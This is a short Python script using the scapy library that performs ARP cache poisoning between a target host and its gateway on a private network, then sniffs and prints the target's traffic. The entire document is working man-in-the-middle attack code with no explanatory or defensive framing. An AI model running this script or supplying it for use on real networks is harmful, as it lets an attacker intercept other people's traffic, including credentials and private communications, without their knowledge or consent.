from scapy.all import *

target_ip = "192.168.0.10"
gateway_ip = "192.168.0.1"

target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)

arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
send(arp_response)

arp_response = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
send(arp_response)

sniff(filter="host " + target_ip, prn=lambda x: x.show())
